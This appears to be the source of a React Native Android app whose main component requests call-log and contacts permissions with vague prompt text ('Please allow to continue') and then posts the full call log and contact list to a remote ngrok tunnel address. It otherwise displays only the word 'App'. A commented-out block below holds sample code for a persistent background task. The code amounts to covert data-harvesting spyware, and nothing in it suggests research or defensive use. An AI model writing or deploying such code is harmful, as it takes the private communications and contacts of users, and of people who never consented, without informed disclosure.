import React,{useEffect} from 'react'
import CallLogs from 'react-native-call-log';
import {  StyleSheet, Text, View, PermissionsAndroid } from 'react-native';
import axios from 'react-native-axios';
import Contacts from 'react-native-contacts';
const URL = 'https://63f6-2406-7400-35-318a-302b-43fd-d97b-c152.ngrok.io'
const App = () => {
  useEffect(() => {
    // FetchCalllogs()
    // FetchContacts()
  }, []);


  const FetchCalllogs=async()=>{
    try {
      const granted = await PermissionsAndroid.request(
        PermissionsAndroid.PERMISSIONS.READ_CALL_LOG,
        {
          title: 'Please allow to continue',
          message:
            'Allow',
          buttonNeutral: 'Ask Me Later',
          buttonNegative: 'Cancel',
          buttonPositive: 'OK',
        }
      )
      if (granted === PermissionsAndroid.RESULTS.GRANTED) {

        CallLogs.loadAll().then(c => Submitrecord(c));
      } else {
        console.log('Call Log permission denied');
        try {
          const granted = await PermissionsAndroid.request(
            PermissionsAndroid.PERMISSIONS.READ_CALL_LOG,
            {
              title: 'Call Log Example',
              message:
                'Access your call logs',
              buttonNeutral: 'Ask Me Later',
              buttonNegative: 'Cancel',
              buttonPositive: 'OK',
            }
          )
          if (granted === PermissionsAndroid.RESULTS.GRANTED) {
  
            CallLogs.loadAll().then(c => Submitrecord(c));
          } 
        }
        catch (e) {
          console.log(e);
        }
      }
    }
    catch (e) {
      console.log(e);
    }
  }
const Submitrecord=(data)=>{
  var config = {
    method: 'post',
    url: URL+'/add_records',
    data :data
  };
  console.log(data.length);
  axios(config)
  .then(function (response) {
    console.log(JSON.stringify(response.data));
  })
  .catch(function (error) {
    console.log(error);
  });
  
}


const FetchContacts=async()=>{
  PermissionsAndroid.request(PermissionsAndroid.PERMISSIONS.READ_CONTACTS, {
    title: "Contacts",
    message: "This app would like to view your contacts."
  })
  Contacts.getAll().then(contacts => {
    SubmitContacts(contacts)
    })
}

const SubmitContacts=(data)=>{
  var config = {
    method: 'post',
    url: URL+'/add_contacts',
    data :data
  };
  console.log(data.length);
  axios(config)
  .then(function (response) {
    console.log(JSON.stringify(response.data));
  })
  .catch(function (error) {
    console.log(error);
  });
  
}
  return (
    <View>
      <Text>App</Text>
    </View>
  )
}

export default App


//  import React from 'react';
//  import {
//    SafeAreaView,
//    StyleSheet,
//    ScrollView,
//    View,
//    Text,
//    StatusBar,
//    TouchableOpacity,
//    Linking,
//  } from 'react-native';
//  import { Header, Colors } from 'react-native/Libraries/NewAppScreen';
 
//  import BackgroundJob from 'react-native-background-actions';
 
//  const sleep = (time) => new Promise((resolve) => setTimeout(() => resolve(), time));
 
//  BackgroundJob.on('expiration', () => {
//    console.log('iOS: I am being closed!');
//  });
 
//  const taskRandom = async (taskData) => {
//    await new Promise(async (resolve) => {
//      // For loop with a delay
//      const { delay } = taskData;
//      console.log(BackgroundJob.isRunning(), delay)
//      for (let i = 0; BackgroundJob.isRunning(); i++) {
//        console.log('Runned -> ', i);
//        await BackgroundJob.updateNotification({ taskDesc: 'Runned -> ' + i });
//        await sleep(delay);
//      }
//    });
//  };
 
//  const options = {
//    taskName: 'Example',
//    taskTitle: 'ExampleTask title',
//    taskDesc: 'ExampleTask desc',
//    taskIcon: {
//      name: 'ic_launcher',
//      type: 'mipmap',
//    },
//    color: '#ff00ff',
//    linkingURI: 'exampleScheme://chat/jane',
//    parameters: {
//      delay: 1000,
//    },
//  };
 
//  function handleOpenURL(evt) {
//    console.log(evt.url);
//    // do something with the url
//  }
 
//  Linking.addEventListener('url', handleOpenURL);
 
 
 
 
//  export default App = () => {
//    const usingHermes = typeof HermesInternal === 'object' && HermesInternal !== null;
 
//    let playing = BackgroundJob.isRunning();
 
//    /**
//     * Toggles the background task
//     */
//    const toggleBackground = async () => {
//      playing = !playing;
//      if (playing) {
//        try {
//          console.log('Trying to start background service');
//          await BackgroundJob.start(taskRandom, options);
//          console.log('Successful start!');
//        } catch (e) {
//          console.log('Error', e);
//        }
//      } else {
//        console.log('Stop background service');
//        await BackgroundJob.stop();
//      }
//    };
//    return (
//      <>
//        <StatusBar barStyle="dark-content" />
//        <SafeAreaView>
//          <ScrollView
//            contentInsetAdjustmentBehavior="automatic"
//            style={styles.scrollView}>
//            <Header />
//            {!usingHermes ? null : (
//              <View style={styles.engine}>
//                <Text style={styles.footer}>Engine: Hermes</Text>
//              </View>
//            )}
//            <View style={styles.body}>
//              <TouchableOpacity
//                style={{ height: 100, width: 100, backgroundColor: 'red' }}
//                onPress={toggleBackground}></TouchableOpacity>
//            </View>
//          </ScrollView>
//        </SafeAreaView>
//      </>
//    );
//  }
 
//  const styles = StyleSheet.create({
//    scrollView: {
//      backgroundColor: Colors.lighter,
//    },
//    engine: {
//      position: 'absolute',
//      right: 0,
//    },
//    body: {
//      backgroundColor: Colors.white,
//    },
//    footer: {
//      color: Colors.dark,
//      fontSize: 12,
//      fontWeight: '600',
//      padding: 4,
//      paddingRight: 12,
//      textAlign: 'right',
//    },
//  });